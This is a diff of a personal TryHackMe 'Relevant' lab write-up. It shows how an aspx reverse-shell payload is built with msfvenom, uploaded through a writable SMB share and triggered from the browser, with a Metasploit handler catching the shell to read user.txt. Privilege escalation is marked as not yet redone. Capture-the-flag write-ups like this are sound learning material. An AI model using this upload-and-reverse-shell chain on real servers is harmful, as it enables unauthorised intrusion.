@@ -35,10 +35,10 @@ I could put test.txt into the smb. In the smb share `put text.txt`
 
 
 make payload  (note check payload is the same in msfvenom and msfconsole)
+.aspx files are Active Server Pages for .NET web applications (Microsoft IIS servers usually run these).
 ```
 sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.137.19 LPORT=8910 -f aspx -o reverse1.aspx
 ```
-![payload](https://github.com/ClearLotus-git/writeups/blob/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20155335.png?raw=true)
 
 in the smb share add   
 ```
@@ -52,9 +52,9 @@ put reverse.aspx
 
 browser
 ```
-http://10.10.10.144:49663/nt4wrksv/reverse1.aspx
+http://10.10.10.144:49663/nt4wrksv/reverse.aspx
 ```
-execute the browser and msfconsole 
+execute the browser and msfconsole (refresh browser)
 
 ```
 msf6 exploit(multi/handler) > use exploit/multi/handler
@@ -90,12 +90,21 @@ dir
 
  Directory of c:\windows\system32\inetsrv
 ```
+This is the image of the msf and the browser (note the browser has reverse1.aspx this 
+should just be the payload file.. mine is different because intitial i wrote a bad payload 
+so i changed the file name.. but use the same file as the payload and what is in the smb share)
+![cmd and brownser screenshot](https://github.com/ClearLotus-git/writeups/raw/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20162543.png)
+
+
 msfshell
 
 ```
 cd c:\Users\Bob\Desktop
 ```
-user.txt
+open user.txt
+![Screenshot](https://github.com/ClearLotus-git/writeups/raw/main/TryHackMe/Relevant/screenshots/Screenshot%202025-05-28%20162649.png)
+
+
 
 ---------------------->>>> priv escalation need to redo. <<<<<----------------- start here to see about exploit
 i cant remember how i did it the first time 
